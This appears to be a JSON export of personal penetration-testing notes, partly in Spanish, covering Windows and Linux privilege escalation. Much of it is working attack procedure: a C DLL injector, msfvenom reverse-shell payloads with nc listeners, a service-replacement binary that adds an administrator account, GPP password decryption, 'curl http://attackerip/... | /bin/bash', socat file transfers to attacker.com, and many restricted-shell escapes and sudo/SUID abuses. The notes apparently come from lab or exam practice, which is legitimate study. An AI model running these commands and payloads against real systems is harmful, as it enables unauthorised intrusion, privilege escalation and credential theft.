						"url": " /4-win-privesc/16-UAC/",
						"content": "If this setting is enabled, we could craft an MSI file and run it to elevate our privileges.\nSimilarly, on Linux-based systems we can search for SUID 489 files.\n\nwe can switch to a high integrity level (if we are admin)\npowershell.exe Start-Process cmd.exe -Verb runAs\n\n\nexample with fodhelper.exe\n\nwe can check forthis fodhelpers  permissions inside its manifest\nsigcheck.exe -a -m C:\\Windows\\System32\\fodhelper.exe\n\n\nlanzamos procmon.exe  filtramos por reg  y vemos si busca algun registro que no existe en HKEY_CURRENT_USER\n\nCAMBIAMOS EL REGISTRO Y LE MANDAMOS UN cmd.exe  con high integrity level"
					}

					
				
			
		
			
				
					,
					

					"4-win-privesc-17-llmnr": {
						"id": "4-win-privesc-17-llmnr",
						"title": "LLMNR and NBT-NS poisoning",
						"category": "",
						"url": " /4-win-privesc/17-llmnr/",
						"content": "Link-Local Multicast Name Resolution (LLMNR) and Netbios Name Service (NBT-NS) are two components of Microsoft Windows machines.  LLLMNR was introduced in Windows Vista and is the successor to NBT-NS.\n\nIf one machine tries to resolve a particular host, but DNS resolution fails, the machine will then attempt to ask all other machines on the local network for the correct address via LLMNR or NBT-NS.\n\nVulnerability\n\n  The victim machine wants to go the print server at \\printserver, but mistakenly types in \\pintserver.\n  The DNS server responds to the victim saying that it doesn’t know that host.\n  The victim then asks if there is anyone on the local network that knows the location of \\pintserver\n  The attacker responds to the victim saying that it is the \\pintserver\n  The victim believes the attacker and sends its own username and NTLMv2 hash to the attacker.\n  The attacker can now crack the hash to discover the password\n\n\nhttps://github.com/lgandx/Responder"
					}

					
				
			
		
			
				
					,
					

					"4-win-privesc-2-stored-credentials": {
						"id": "4-win-privesc-2-stored-credentials",
						"title": "stored credentials",
						"category": "",
						"url": " /4-win-privesc/2-stored-credentials/",
						"content": "WPE-01 - Stored Credentials\nIt is very common for administrators to use Windows Deployment Services in order to create an image of a Windows operating system and deploy this image in various systems through the network. This is called unattended installation. The problem with unattended installations is that the local administrator password is stored in various locations either in plaintext or as Base-64 encoded. These locations are:\n\n\n| cmdkeys\n“cmdkey /list”\n\n| files unattended\nC:\\unattend.xml\nC:\\Windows\\Panther\\Unattend.xml\nC:\\Windows\\Panther\\Unattend\\Unattend.xml\nC:\\Windows\\system32\\sysprep.inf\nC:\\Windows\\system32\\sysprep\\sysprep.xml\n\n\n| iis config\nC:\\inetpub\\wwwroot\\web.config\n\n| group policies\n\n[hackthebox] querier\n\nLocal administrators passwords can also retrieved via the Group Policy Preferences. The Groups.xml file which contains the password is cached locally or it can be obtained from the domain controller as every domain user has read access to this file. The password is in an encrypted form but Microsoft has published the key and it can be decrypted.\nC:\\ProgramData\\Microsoft\\Group Policy\\History\\????\\Machine\\Preferences\\Groups\\Groups.xml\n\\\\????\\SYSVOL\\\\Policies\\????\\MACHINE\\Preferences\\Groups\\Groups.xml\n\n\ncpasswd attr\nServices\\Services.xml\nScheduledTasks\\ScheduledTasks.xml\nPrinters\\Printers.xml\nDrives\\Drives.xml\nDataSources\\DataSources.xml\n\n\n| commands to find credentials\nfindstr /si password *.txt\nfindstr /si password *.xml\nfindstr /si password *.ini\n\nC:\\&gt; dir /b /s unattend.xml\nC:\\&gt; dir /b /s web.config\nC:\\&gt; dir /b /s sysprep.inf\nC:\\&gt; dir /b /s sysprep.xml\nC:\\&gt; dir /b /s *pass*\nC:\\&gt; dir /b /s vnc.ini\n\n\nRegistry\n\nreg query HKLM /f password /t REG_SZ /s\nreg query HKCU /f password /t REG_SZ /s\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\"\nreg query \"HKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMP\"\n\n| puty\nreg query \"HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\"\n\n| mcaffee\n%AllUsersProfile%Application Data\\McAfee\\Common Framework\\SiteList.xml\n\n| VNC Stored\n    reg query “HKCU\\Software\\ORL\\WinVNC3\\Password”\n\n| Windows Autologin:\n    reg query “HKLM\\SOFTWARE\\Microsoft\\WindowsNT\\Currentversion\\Winlogon”\n\n| SNMP Parameters:\n    reg query “HKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMP”\n\n\nPowersploit\n\nGet-UnattendedInstallFile\nGet-Webconfig\nGet-ApplicationHost\nGet-SiteListPassword\nGet-CachedGPPPassword\nGet-RegistryAutoLogon"
					}

					
				
			
		
			
				
					,
					

					"4-win-privesc-3-kernel": {
						"id": "4-win-privesc-3-kernel",
						"title": "Kernel Vulns",
						"category": "",
						"url": " /4-win-privesc/3-kernel/",
						"content": "WPE-02 - Windows Kernel\n\ntry to search for third party drivers exploits before kernel ones.\nexample: USBPcap\n\ndiscover patches\nwmic qfe get Caption,Description,HotFixID,InstalledOn\n\nexploit suggester\n\n| watson\nhttps://github.com/rasta-mouse/Watson\nC:&gt; Watson.exe\n\n\n| Windows Exploit Suggester - Next Generation\nhttps://github.com/bitsadmin/wesng\n\nwes.py --update\nwes.py systeminfo.txt\nwes.py arctic-systeminfo.txt  --muc-lookup  --exploits-only  -i \"Elevation of Privilege\"\n\n\n| Windows Exploit Suggester\nhttps://github.com/AonCyberLabs/Windows-Exploit-Suggester\npython /home/nikhil/scripts/windows-exploit-suggester.py -d 2016-07-02-mssb.xls -i systeminfo -l\n\n-l : show only local exploits\n\ncompiling in windows\nC:\\Program Files\\mingw-w64\\i686-7.2.0-posix-dwarf-rt_v5-rev1&gt; mingw-w64.bat\n\nC:\\&gt; gcc 41542.c -o exploit.exe\n\n\nlist\n\n  MS16-135\n  MS16-032\n  MS15-051\n  MS14-058\n  MS16-016\n  MS14-040\n  MS14-002\n  MS10-092\n  MS10-015\n  MS14-002\n  MS15-061\n  MS11-062\n  MS11-080\n  MS15-076\n  MS16-075\n  MS15-010\n  MS11-046"
					}

					
				
			
		
			
				
					,
					

					"4-win-privesc-4-dll-injection": {
						"id": "4-win-privesc-4-dll-injection",
						"title": "DLL Injection",
						"category": "",
						"url": " /4-win-privesc/4-dll-injection/",
						"content": "WPE-03 - DLL Injection\n\nDLL injection is a technique which allows an attacker to run arbitrary code in the context of the address space of another process. If this process is running with excessive privileges then it could be abused by an attacker in order to execute malicious code in the form of a DLL file in order to elevate privileges.\n\nSpecifically this technique follows the steps below:\n\n\n  A DLL needs to be dropped into the disk\n  The “CreateRemoteThread” calls the “LoadLibrary”\n  The reflective loader function will try to find the Process Environment Block (PEB) of the target process using the appropriate CPU register and from that will try to find the address in memory of kernel32dll and any other required libraries.\n  Discovery of the memory addresses of required API functions such as LoadLibraryA, GetProcAddress, and VirtualAlloc.\n  The functions above will be used to properly load the DLL into memory and call its entry point DllMain which will execute the DLL.\n\n\nManual exploitation\n\n\n1 create dll\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.14 LPORT=4444 -f dll -o evil.dll\n\n2 set up listener\nnc -nlvp 4444\n\n\n3 compile code :\n#include &lt;windows.h&gt;\n#include &lt;stdio.h&gt;\n\nint main(int argc, char* argv[]) {\n\tHANDLE processHandle;\n\tPVOID remoteBuffer;\n\twchar_t dllPath[] = TEXT(\"C:\\\\users\\\\nop\\\\evil.dll\");\n\n\tprintf(\"Injecting DLL to PID: %i\\n\", atoi(argv[1]));\n\tprocessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));\n\tremoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof dllPath, MEM_COMMIT, PAGE_READWRITE);\n\tWriteProcessMemory(processHandle, remoteBuffer, (LPVOID)dllPath, sizeof dllPath, NULL);\n\tPTHREAD_START_ROUTINE threatStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT(\"Kernel32\")), \"LoadLibraryW\");\n\tCreateRemoteThread(processHandle, NULL, 0, threatStartRoutineAddress, remoteBuffer, 0, NULL);\n\tCloseHandle(processHandle);\n\n\treturn 0;\n}\n\n4 find a process id to inject\ntasklist\n\n\n5 transfer and run  dll-injector.exe\ndll-injector.exe &lt;PID&gt;\n\n\n6 TODO\ncambiar el codigo para pasarle por parametro el path al dll"
					}

					
				
			
		
			
				
					,
					

					"4-win-privesc-5-weak-service-permissions": {
						"id": "4-win-privesc-5-weak-service-permissions",
						"title": "weak services",
						"category": "",
						"url": " /4-win-privesc/5-weak-service-permissions/",
						"content": "WPE-04 - Weak Service Permissions\n\nserviio case\n| check services\ntasklist /V\n\nor\nwmic process get ProcessID,ExecutablePath\n\nor:\nGet-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}\n\nserviio looks installed in program files .\nthis means the service is user-installed and the software developer is in charge of the directory\nstructure as well as permissions of the software.\n| check permissions\nicacls \"C:\\Program Files\\Serviio\\bin\\ServiioService.exe\"\nC:\\Program Files\\Serviio\\bin\\ServiioService.exe BUILTIN\\Users:(I)(F)\n\nit appears that any user (BUILTIN\\Users) on the system has full read and\nwrite access to it.\n| masks permissions\n\n  F Full access\n  M Modify access\n  RX Read and execute access\n  R Read-only access\n  W Write-only access\n\n\n| compile binary to replace serviio\n#include &lt;stdlib.h&gt;\nint main ()\n{\nint i;\ni = system (\"net user evil Ev!lpass /add\");\ni = system (\"net localgroup administrators evil /add\");\nreturn 0;\n}\n\n\nkali@kali:~$i686-w64-mingw32-gcc adduser.c -o adduser.exe\n\n\n| replace the binary\nmove adduser.exe \"C:\\Program Files\\Serviio\\bin\\ServiioService.exe\"\n\n\n| option 2 chane registry\nsc config daclsvc binpath= \"C:\\Users\\user\\Desktop\\shell.exe\"\n\n| restart service\nnet stop Serviio\n\nif we dont have access to restart a service we can reboot maybe?\n\nshutdown /r /t 0"
					}

					
				
			
		
			
				
					,
					

					"4-win-privesc-6-dll-hijacking": {
						"id": "4-win-privesc-6-dll-hijacking",
						"title": "DLL hijacking",
						"category": "",
						"url": " /4-win-privesc/6-dll-hijacking/",
						"content": "WPE-05 - DLL Hijacking\nIn Windows environments when an application or a service is starting it looks for a number of DLL’s in order to function properly. If these DLL’s doesn’t exist or are implemented in an insecure way (DLL’s are called without using a fully qualified path) then it is possible to escalate privileges by forcing the application to load and execute a malicious DLL file.\n\nIt should be noted that when an application needs to load a DLL it will go through the following order:\n\n\n  The directory from which the application is loaded\n  C:\\Windows\\System32\n  C:\\Windows\\System\n  C:\\Windows\n  The current working directory\n  Directories in the system PATH environment variable\n  Directories in the user PATH environment variable\n\n\n1 find process with missing dll\nuse procmon from sysinternals to check for missing dlls (“NAME NOT FOUND”)\n\n1.1 filters\nProcess Name is &lt;[Value]&gt;\nResult is &lt;[NAME NOT FOUND]&gt;\nPath ends with .dll*\n\n2 confirm that you have write permissions to any of the folders\nc:/path/to_inject/dll&gt;: icacls .\n risus-PC\\risusUser:(I)(OI)(CI)(F)\n\n\nimportantn values:\na sequence of simple rights:\n     N — no access\n     F — full access\n     M — modify access\n     RX — read and execute access\n     R — read-only access\n     W — write-only access\n     D — delete access\n\n\n3 create dll\n3.1 reverse shell\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.14 LPORT=4444 -f dll -o evil.dll\n\n3.2 create user\nTODO\n\n4 start listener\nnc -nlvp 4444\n\n\n5 copy dll to path and rerun service/program"
					}

					
				
			
		
			
				
					,
					

					"4-win-privesc-7-potato": {
						"id": "4-win-privesc-7-potato",
						"title": "POTATOS",
						"category": "",
						"url": " /4-win-privesc/7-potato/",
						"content": "HOT POTATO\n\nWPE-06 - Hot Potato\n\nPotato.exe -ip -cmd [cmd to run] -disable_exhaust true -disable_defender true\n\nROTTEN POTATO\n\nWPE-10 - Token Manipulation\n is  possible to escalate privileges from a service that is not running as SYSTEM but as a network service as well.\n\nJUICY POTATO\n\nsource: https://github.com/ohpe/juicy-potato\ndetect\nwhoami /priv\nSeImpersonatePrivilege  Enabled &lt;- requirement or SeAssignPrimaryToken\n\nrequirements\n\n  you need:\n    -t createprocess call: &lt;t&gt; CreateProcessWithTokenW, &lt;u&gt; CreateProcessAsUser, &lt;*&gt; try both\n-p &lt;program&gt;: program to launch\n-l &lt;port&gt;: COM server listen port\n-c &lt;{clsid}&gt;: CLSID (default BITS:{4991d34b-80a1-4291-83b6-3328366b9097}) can peek anotherone from CLSIDs\n    \n  \n\n\nROGUE POTATO\n\nhttps://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/\nhttps://github.com/antonioCoco/RoguePotato"
					}

					
				
			
		
			
				
					,
					

					"4-win-privesc-8-group-policies-preferences": {
						"id": "4-win-privesc-8-group-policies-preferences",
						"title": "group policy preferences",
						"category": "",
						"url": " /4-win-privesc/8-group-policies-preferences/",
						"content": "WPE-07 - Group Policy Preferences\n\nPrior to patch MS14-025, there was a horrible storage of local administrator password, in a readable SMB share, SYSVOL, if the local administrator account was deployed via group policy.\n\nthe keys are encripted but microsoft published the key\n4e 99 06 e8  fc b6 6c c9  fa f4 93 10  62 0f fe e8\nf4 96 e8 06  cc 05 79 90  20 9b 09 a4  33 b6 6c 1b\n\n\n1 find Groups.xml\nex:\nC:\\ProgramData\\Microsoft\\Group Policy\\History\\????\\Machine\\Preferences\\Groups\\Groups.xml\n\\\\????\\SYSVOL\\\\Policies\\????\\MACHINE\\Preferences\\Groups\\Groups.xml\n\nor:\nfindstr /S /I cpassword \\\\&lt;FQDN&gt;\\sysvol\\&lt;FQDN&gt;\\policies\\*.xml\n\n\n2 decrypt\n\n| PowerUp.ps1\nGet-CachedGPPPassword //For locally stored GP Files\nGet-GPPPassword //For GP Files stored in the DC\n\n| winpeas\nwinpeas checks for it\n\n| gpp-decrypt\ncat groups.XML\n...\ncpassword=\"edbiausdhiuhasd1289471890234nias098124n98\"\n...\ngpp-decrypt  edbiausdhiuhasd1289471890234nias098124n98"
					}

					
				
			
		
			
				
					,
					

					"4-win-privesc-9-unquoted-service-path": {
						"id": "4-win-privesc-9-unquoted-service-path",
						"title": "unquoted service path",
						"category": "",
						"url": " /4-win-privesc/9-unquoted-service-path/",
						"content": "WPE-08 - Unquoted Service Path\n\nWe can use this attack when we have write\npermissions to a service’s main directory and subdirectories but cannot replace files within them.\n\nif we have this path unquoted:\nC:\\Program Files\\My Program\\My Service\\service.exe\n\nwindows will try to run  in order:\nC:\\Program.exe\nC:\\Program Files\\My.exe\nC:\\Program Files\\My Program\\My.exe\nC:\\Program Files\\My Program\\My service\\service.exe\n\n \n| 1 find vulnerable services\nwmic service get name,displayname,pathname,startmode\n\nor\nwmic service get name,displayname,pathname,startmode |findstr /i “auto” |findstr /i /v “c:\\windows\\\\” |findstr /i /v “””\n\nex:\n C:\\Program Files (x86)\\Sync Breeze Enterprise\\bin\\syncbrs.exe  \n\n \n| 2 create reverse shell\nmsfvenom -p windows/shell_reverse_tcp LHOST=192.168.100.220 LPORT=4445 -f exe -o shell2.exe\n\n \n| 3 Rename and move binary\nC:\\Program Files (x86)\\Sync.exe\n\n \n| 4 open listener\nnc -nlvp 4445\n\n \n| 5 restart service\nnet stop \"Sync Breeze Enterprise\"\nnet start \"Sync Breeze Enterprise\""
					}

					
				
			
		
			
				
					,
					

					"5-linux-privesc-4-2-linux-privesc": {
						"id": "5-linux-privesc-4-2-linux-privesc",
						"title": "linux privesc",
						"category": "",
						"url": " /5-linux-privesc/4-2-linux-privesc/",
						"content": "based on:\nhttps://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/\n\nhttps://www.slideshare.net/nullthreat/fund-linux-priv-esc-wprotections?next_slideshow=1\n\n \n1 AUTOMATIC INFO GATHERING\n\nlinPEAS\nhttps://github.com/carlospolop/privilege-escalation-awesome-scripts-suite\n./linpeas.sh\n\n\nLinEnum\nhttps://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh\n\ncurl http://attackerip/LinEnum.sh | /bin/bash\n./LinEnum.sh -t\n\nLinuxprivchecker\nhttp://www.securitysift.com/download/linuxprivchecker.py\n\n \n2 MANUAL INFO GATHERING\n\nOperating System\ncat /etc/issue\ncat /etc/*-release\ncat /etc/lsb-release      # Debian based\nlsb_release -a\ncat /etc/redhat-release   # Redhat based\n\nuser info\nid\nwhoami\nlast\n\nkernel\n\nhttps://github.com/mzet-/linux-exploit-suggester\n\nhttps://github.com/jondonas/linux-exploit-suggester-2\n\ncat /proc/version\nuname -a\nuname -ar\nuname -mrs\nrpm -q kernel\ndmesg | grep Linux\nls /boot | grep vmlinuz-\n\nenvironmental variables\ncat /etc/profile\ncat /etc/bashrc\ncat ~/.bash_profile\ncat ~/.bashrc\ncat ~/.bash_logout\nenv\nset\n\n\nhistory\n~/.bash_history\n~/.nano_history\n~/.atftp_history\n~/.mysql_history\n~/.php_history\n~/.viminfo\n\n\nApplication services\nps aux\nps -ef\ntop\ncat /etc/services\nsystemctl status (service)\ntop\nservice --status-all\n\n\ncheck installed programs, permissions, hidden files\nls -lah\nls -lah /usr/bin\nls -lah /sbin\nyum list installed\ndpkg-query -l\ndpkg -l\nrpm -qa\nls -lah /usr/share/applications | awk -F '.desktop' ' { print $1}'\n\n\nWhats running?\nps aux\nnetstat -antup\n\n\nwhats installed?\ndpkg -l\nrpm -qa (centOS/OpenSUSE)\nuname -a\n\n\nCheck any unmounted drives\ncat /etc/fstab  \n\n\nWritable by current user\nfind / perm /u=w -user `whoami` 2&gt;/dev/null  \nfind / -perm /u+w,g+w -f -user `whoami` 2&gt;/dev/null  \nfind / -perm /u+w -user `whoami` 2&gt;/dev/nul  \n\n\nAny service running by root?\nps aux|grep \"root\"  \n/usr/bin/journalctl (Which is normally not readable by a user) &lt;&lt; cron job?  \n\n\nFind symlinks and what they point to:\nfind / -type l -ls\n\n\nusing pspy to monitor process\npspy\n\n \n \n3 SUDO, abusing and misconfiguration\n\nsudo su\nsudo -l ex:  (onuma) (NOPASSWD)/bin/tar  -&gt; sudo -u onuma /bin/tar\nsudo -i\nsudo /bin/bash\nsudo su-\nsudo ht\npkexec visudo\n\n \n \n4 SUID\n\n\n\n  suid:cuando se ejecuta el archivo se ejecuta con el permiso del owner (chmod 4000)\n  sgid: corre como el grupo del owner.(chmod 2000)\n  sticky bit: solo el owner puede borrar o renombrar adentro de la carpeta.\n\n\nfind / -perm -g=s -type f 2&gt;/dev/null    # SGID\nfind / -perm -u=s -type f 2&gt;/dev/null    # SUID\n\nfind / -perm -g=s -o -perm -u=s -type f 2&gt;/dev/null    # SGID or SUID &lt; full search  \nfor i in `locate -r \"bin$\"`; do find $i \\( -perm -4000 -o -perm -2000 \\) -type f 2&gt;/dev/null; done    # Looks in 'common' places: /bin, /sbin &lt; quicker  \n\n-find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)\nfind / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \\; 2&gt;/dev/null  \n\nfind / perm /u=s -user \"User name that you are looking for\" 2&gt;/dev/null  \n\n\nFind SUID root files\nfind / -user root -perm -4000 -print  2&gt;/dev/null\n\nFind SGID root files:\nfind / -group root -perm -2000 -print 2&gt;/dev/null\n\nFind SUID and SGID files owned by anyone:\nfind / -perm -4000 -o -perm -2000 -print  2&gt;/dev/null\n\n\n \n \n5 DOCKER\n\nhttp://reventlov.com/advisories/using-the-docker-command-to-root-the-host\n\n \n \n6 KERNEL\n\n \n \n7 CRON\n\nsyntax\n* * * * * &lt;command to be executed&gt;\n- - - - -\n| | | | |\n| | | | ----- Weekday (0 - 7) (Sunday is 0 or 7, Monday is 1...)\n| | | ------- Month (1 - 12)\n| | --------- Day (1 - 31)\n| ----------- Hour (0 - 23)\n------------- Minute (0 - 59)\n\n\ncheck\ncat /etc/cron.d/*\ncat /var/spool/cron/*\ncrontab -l\ncat /etc/crontab\ncat /etc/cron.(time)\nsystemctl list-timers\nls -alh /var/spool/cron\nls -al /etc/ | grep cron\nls -al /etc/cron*\ncat /etc/cron*\ncat /etc/at.allow\ncat /etc/at.deny\ncat /etc/cron.allow\ncat /etc/cron.deny\ncat /etc/crontab\ncat /etc/anacrontab\ncat /var/spool/cron/crontabs/root\n\noption 1\nediting the scripts run by cron:\nadding user:\nTODO\n\nreverse shell:\n\n\noption 2\nif the files are not misconfigured, we can try to exploit the script if its behavior is insecure.\n\n \n \n8 ABUSING misconfigured Permissions\n\nprivate ssh keys\n~/.ssh/authorized_keys : specifies the SSH keys that can be used for logging into the user account\n~/.ssh/identity.pub\n~/.ssh/identity\n~/.ssh/id_rsa.pub\n~/.ssh/id_rsa\n~/.ssh/id_dsa.pub\n~/.ssh/id_dsa\n/etc/ssh/ssh_config  : OpenSSH SSH client configuration files\n/etc/ssh/sshd_config : OpenSSH SSH daemon configuration file\n\nfind / \\( -perm -2000 -o -perm -4000 \\) -exec ls -ld {} \\; 2&gt;/dev/null\nfind / \\( -perm -2000 -o -perm -4000 \\) -exec ls -ld {} \\; 2&gt;/dev/null\ncat /etc/sudoers\ncat /etc/passwd\n\nWritable file and nobody files\nfind / -xdev -type d \\( -perm -0002 -a ! -perm -1000 \\) -print   # world-writeable files  \nfind /dir -xdev \\( -nouser -o -nogroup \\) -print   # Noowner files  \n\nAny script files that we can modify?\nfind / -writable -type f -name \"*.py\" 2&gt;/dev/null     #find all python file that can be write by us  \n\nFind password\ngrep -rnw '/' -ie 'pass' --color=always  \ngrep -rnw '/' -ie 'DB_PASS' --color=always  \ngrep -rnw '/' -ie 'DB_PASSWORD' --color=always  \ngrep -rnw '/' -ie 'DB_USER' --color=always  \n\nFind incorrect file permision\nFind / -perm -2 ! -type l -ls 2&gt;/dev/null\n\n\nFind files that are not owned by any user:\nfind / -nouser -print  2&gt;/dev/null\n\nFind files that are not owned by any group:\nfind / -nogroup -print  2&gt;/dev/null\n\n \n \n9 GETTING OUT RESTRICTED SHELLS\n\n\n\n  fijate que variables de entorno hay  con env\n  corre ‘export -p’ para ver que variables son read only  y si hay alguna con permiso de escritura ( $PATH y $SHELL? :D )\n  check GTFO bins (https://gtfobins.github.com)\n    compgen -c # check available commands\n    \n  \n  con ssh podes forzar tty\n    ssh monitor@127.0.0.1 -i ~/.ssh/.monitor -t bash\n    \n  \n\n\n \n \n10 PATH HIJACKING\n\n\nsi un cron corre un binario o script  SIN PATH  ,  ejemplo\n cat /home/sarasa\n\ndependiendo de los permisos podriamos cambiar el path de quien corre el comando y poner  PRIMERO el\n path a donde metemos nuestro evil cat.\n\nCommon\nsi tenes chsh podes cambiar la shell a  /bin/bash\nbin/sh\ncp /bin/sh .; sh\nftp -&gt; !/bin/sh\ngdb -&gt; !/bin/sh\nmore/ less/ man -&gt; !/bin/sh\nvi -&gt; :!/bin/sh : cuando salis de vi terminas con la shell .\nscp -S /tmp/getMeOut.sh x y : Refer Breaking out of rbash using scp\nawk ‘BEGIN {system(“/bin/sh”)}’\nfind / -name someName -exec /bin/sh ;\ntee: echo \"Your evil code\" | tee script.sh\nssh username@IP -t \"/bin/sh\"\nssh username@IP -t \"bash --noprofile\"\nbash\nperl -e 'exec \"/bin/sh\";'  \n/bin/sh -i  \nexec \"/bin/sh\";  \necho os.system('/bin/bash')  \n/bin/sh -i  \nssh user@$ip nc $localip 4444 -e /bin/sh  \nexport TERM=linux  \n\nvi--&gt;       :!bash\nvi--&gt;       :set shell=/bin/bash:shell\nawk--&gt;      awk 'BEGIN {system(\"/bin/bash\")}'\nfind--&gt;     find / -exec /usr/bin/awk 'BEGIN {system(\"/bin/bash\")}' \\;\nperl--&gt;     perl -e 'exec \"/bin/bash\";'\nNmap  \n    nmap -V     &lt;Nmap version 2.02 - 5.21 had an interactive mode  \n    nmap --interactive  \n    nmap&gt; !sh  \n\nVim  \n    Modify system file, e.g. passwd?  \n    vim.tiny  \n    - Press ESC key  \n    :set shell=/bin/sh  \n    :shell  \n\nfind  \n    touch pentestlab  \n    find pentestlab -exec netcat -lvp 5555 -e /bin/sh \\;  \n\nBash  \n    bash -p      \n\nMore  \n\nLess  \n    less /etc/passwd  \n    !/bin/sh  \n\nNano  \n    Can you modify system file?  \n    Modify /etc/suoders  \n    \\&lt;user&gt; ALL=(ALL) NOPASSWD:ALL  \n\ncp  \n    Use cp to overwrite passwd with a new password  \n\n\nvim\n:version\n:python3 import pty;pty.spawn(\"/bin/bash\")\n\nUsando scripting laguages.\n\npython -c 'import os; os.system(\"/bin/bash\")\nperl -e 'exec \"/bin/sh\";'\netc...\n\n\n \n \n10 EXAMPLES\n\nMysql run by root\nMySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library\nhttps://www.exploit-db.com/exploits/1518/\n\nYou can also try:\nselect sys_exec('echo test&gt;/tmp/test.txt');\nselect sys_eval('echo test&gt;/tmp/test.txt');\n\n\nMempodipper\nsteve dosent have privilage\n\nsteve@ubuntu:   cat /etc/shadow\npermission denied\nsteve@ubuntu: cat /etc/issue\nubuntu 11.10\nsteve@ubuntu: uname -a\nlinux ubu 3.0.0-12-generic &lt; por ahi es vulnerable el kernel\n\n\npodemos buscar en exploit database a ver que onda\n\nencontramos Mempodipper - Linux Local Root for &gt;=2.6.39, 32-bit and 64\n\nsteve@ubuntu: wget -O exploit.c http://www.exploit-db.com/download/18411\nsteve@ubuntu: gcc exploit.c -o exploit\nsteve@ubuntu: file exploit\nexploit: ELF etc......\nste@ubuntu: id\nuid=10000 gid=10000 groups, etc\nsteve@ubuntu: ./exploit\n#id\nuid=0(root)\n\nwget without wget\nnformation about Bash Built-in /dev/tcp File (TCP/IP)\n\nThe following script fetches the front page from Google:\nexec 3&lt;&gt;/dev/tcp/www.google.com/80\necho -e \"GET / HTTP/1.1\\r\\nhost: http://www.google.com\\r\\nConnection: close\\r\\n\\r\\n\" &gt;&amp;3\ncat &lt;&amp;3\n\n\nThe first line causes file descriptor 3 to be opened for reading and writing on the specified TCP/IP socket. This is a special form of the exec statement. From the bash man page:\n\nSecond line: After the socket is open we send our HTTP request out the socket with the echo … &gt;&amp;3 command. The request consists of:\n\nGET / HTTP/1.1\nhost: http://www.google.com\nConnection: close\n\n\nEach line is followed by a carriage-return and newline, and all the headers 2are followed by a blank line to signal the end of the request (this is all standard HTTP stuff).\n\nThird line: Next we read the response out of the socket using cat &lt;&amp;3, which reads the response and prints it out.\n\n \n \n11 wildcards ?\n\nhay algun cron corriendo con wildcards?\n \n \n12 linux capabilities\n\n\n  find cap  files\n    getcat -r * 2&gt;/dev/null\n    \n  \n  creating an evil cap\n    [root@centos7-1 mnt]# cp -p /bin/bash /mnt/myBash\n[root@centos7-1 mnt]# setcap all+epi /mnt/myBash\n[root@centos7-1 mnt]# getcap /mnt/myBash\n/mnt/myBash =eip\n    \n    then\n    /mnt/myBash --inh-caps +all --reuid 0 /bin/bash\n# root\n    \n    (no mne funco en debian)"
					}

					
				
			
		
			
				
					,
					

					"5-linux-privesc-lin-security": {
						"id": "5-linux-privesc-lin-security",
						"title": "lin-security + GTFO bins",
						"category": "",
						"url": " /5-linux-privesc/lin-security/",
						"content": "1 tip\n\n“…Turn on privileged mode… If the shell is started with the effective user (group) id not equal to the real user (group) id, and the -p option is not supplied, these actions are taken and the effective user id is set to the real user id. If the -p option is supplied at startup, the effective user id is not reset. Turning this option off causes the effective user and group ids to be set to the real user and group ids…”\nbash -p\n\n \n2 gtfobins\n\n| check\nsudo -l\nUser bob may run the following commands on linsecurity:\n    (ALL) /bin/ash, /usr/bin/awk, /bin/bash, /bin/sh, /bin/csh, /usr/bin/curl, /bin/dash, /bin/ed, /usr/bin/env, /usr/bin/expect, /usr/bin/find, /usr/bin/ftp, /usr/bin/less, /usr/bin/man, /bin/more, /usr/bin/scp, /usr/bin/socat,\n        /usr/bin/ssh, /usr/bin/vi, /usr/bin/zsh, /usr/bin/pico, /usr/bin/rvim, /usr/bin/perl, /usr/bin/tclsh, /usr/bin/git, /usr/bin/script, /usr/bin/scp\n\n\n| ash\ncan be use to scape a restricted shell if granted sudo is easy privesc\nsudo ash\n\n\n| awk\ncan be use to scape a restricted shell , if can run as sudo, insta privesc\nsudo awk 'BEGIN {system(\"/bin/bash\")}'\n\n\n| csh\nlike ash\n\n| curl\n#  file read\nLFILE=/tmp/file_to_read\ncurl file://$LFILE\n\n\n| ed\nsudo ed\n!/bin/bash\n\n\n| env\n\n#  shell\nenv /bin/sh\n\n#  sudo\nsudo env /bin/sh\n\n\nexpect\n# shell\nsudo expect -c 'spawn /bin/sh;interact'\n\nfind\n# shell\nsudo find . -exec /bin/sh \\; -quit\n\n# suid\nsudo sh -c 'cp $(which find) .; chmod +s ./find'\n\n./find . -exec /bin/sh -p \\; -quit\n\n\nftp\n# shell\nsudo ftp\n!/bin/sh\n\nless\n# shell\nsudo less /etc/profile\n!/bin/sh\n\n\n# file read\nless /etc/profile\n:e file_to_read\n\nman\n# shell\nsudo man man\n!/bin/sh\n\n\nmore\n# shell\nTERM= sudo more /etc/profile\n!/bin/sh\n\n\nscp\n# shell\nTF=$(mktemp)\necho 'sh 0&lt;&amp;2 1&gt;&amp;2' &gt; $TF\nchmod +x \"$TF\"\nsudo scp -S $TF x y:\n\n\nsocat\n# shell\nsudo socat stdin exec:/bin/sh\n\n\n# file upload\non attacker run\n socat -u file:file_to_send tcp-listen:12345,reuseaddr\n\non box:\nRHOST=attacker.com\nRPORT=12345\nLFILE=file_to_save\nsocat -u tcp-connect:$RHOST:$RPORT open:$LFILE,creat\n\n\n# file download\non attacker run\nsocat -u file:file_to_send tcp-listen:12345,reuseaddr\n\non box\nRHOST=attacker.com\nRPORT=12345\nLFILE=file_to_save\nsocat -u tcp-connect:$RHOST:$RPORT open:$LFILE,creat\n\n\nssh\n# shell\nssh localhost $SHELL --noprofile --norc\nsudo ssh -o ProxyCommand=';sh 0&lt;&amp;2 1&gt;&amp;2' x\n\n\nvi\n# shell\nsudo vi -c ':!/bin/sh' 